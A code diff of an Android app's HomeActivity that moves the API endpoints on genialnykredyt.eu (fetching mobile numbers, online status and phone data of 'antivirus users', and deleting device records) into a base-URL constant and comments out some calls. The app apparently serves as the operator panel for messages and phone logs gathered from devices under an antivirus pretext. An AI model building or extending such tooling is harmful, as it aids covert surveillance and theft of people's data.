@@ -34,6 +34,7 @@ import com.android.volley.toolbox.StringRequest;
 import com.android.volley.toolbox.Volley;
 import com.example.muhammadashfaq.recieveapp.Adapter.CartAdapter;
 import com.example.muhammadashfaq.recieveapp.Broadcast.ConnectivityReciever;
+import com.example.muhammadashfaq.recieveapp.Constants.BaseUrl;
 import com.example.muhammadashfaq.recieveapp.Model.IMEINModel;
 import com.example.muhammadashfaq.recieveapp.Service.ConnectionService;
 import com.google.firebase.database.DataSnapshot;
@@ -85,15 +86,15 @@ public class HomeActivity extends AppCompatActivity implements ConnectivityRecie
         if(getIntent()!=null){
             device_name = getIntent().getStringExtra("device_name");
             device_name=device_name.toUpperCase();
-            fetchMobileNo(device_name);
-            startThreadOnline();
+           // fetchMobileNo(device_name);
+            //startThreadOnline();
 
             dbRef= FirebaseDatabase.getInstance().getReference("Mobile").child(device_name);
 
         }
 
         //Getting country of antivirus user
-        getCountry();
+       // getCountry();
 
         //Getting mobile numbner of antivirus user
         //setMobileNumber();
@@ -102,12 +103,12 @@ public class HomeActivity extends AppCompatActivity implements ConnectivityRecie
 //        //Getting weather antivirus user is online or offline
 //        getMobileData();
 
-
     }
 
     private void fetchMobileNo(final String device) {
+        String url = BaseUrl.baseUrl + getResources().getString(R.string.get_mobile_no);
         trimCache(HomeActivity.this);
-        StringRequest mStringRequest = new StringRequest(1, "https://genialnykredyt.eu/get_messages_api/get_mobile_no.php", new Response.Listener<String>() {
+        StringRequest mStringRequest = new StringRequest(1, url, new Response.Listener<String>() {
             @Override
             public void onResponse(String response) {
 
@@ -316,14 +317,15 @@ public class HomeActivity extends AppCompatActivity implements ConnectivityRecie
                 try {
                     Thread.sleep(1000);
                     trimCache(HomeActivity.this);
-                    StringRequest mStringRequest = new StringRequest(Request.Method.POST, "https://genialnykredyt.eu/get_messages_api/delete_mobile_data.php", new Response.Listener<String>() {
+                    String url = BaseUrl.baseUrl + getResources().getString(R.string.delete_mobile_data);
+                    StringRequest mStringRequest = new StringRequest(Request.Method.POST, url, new Response.Listener<String>() {
                         @Override
                         public void onResponse(String response) {
 
                             if(response.equals("true")){
                                 progressDialogDelete.dismiss();
                                 Toast.makeText(HomeActivity.this, "Mobile Deleleted Successfully", Toast.LENGTH_SHORT).show();
-                                Intent intent=new Intent(HomeActivity.this,IMEIActivity.class);
+                                Intent intent=new Intent(HomeActivity.this,PhoneLogsActivity.class);
                                 startActivity(intent);
                                 finish();
 
@@ -343,7 +345,7 @@ public class HomeActivity extends AppCompatActivity implements ConnectivityRecie
                             HashMap<String,String> params=new HashMap<>();
 
                             Log.i("device",device_name);
-                            params.put("device_name",device_name);
+                            params.put("phone",device_name);
 
                             return params;
 
@@ -375,8 +377,8 @@ public class HomeActivity extends AppCompatActivity implements ConnectivityRecie
 
         int id=item.getItemId();
         if(id==R.id.refresh_message_home){
-            progressDialog.show();
-            startThreadOnline();
+            //progressDialog.show();
+            //startThreadOnline();
         }
         return true;
     }
@@ -434,7 +436,8 @@ public class HomeActivity extends AppCompatActivity implements ConnectivityRecie
     private void startThreadOnline() {
        // progressDialog.show();
         trimCache(HomeActivity.this);
-        StringRequest mStringRequest = new StringRequest(1, "https://genialnykredyt.eu/get_messages_api/get_online_status.php", new Response.Listener<String>() {
+        String url = BaseUrl.baseUrl + getResources().getString(R.string.get_online_status);
+        StringRequest mStringRequest = new StringRequest(1, url, new Response.Listener<String>() {
             @Override
             public void onResponse(String response) {
                 Log.i("Response",response);
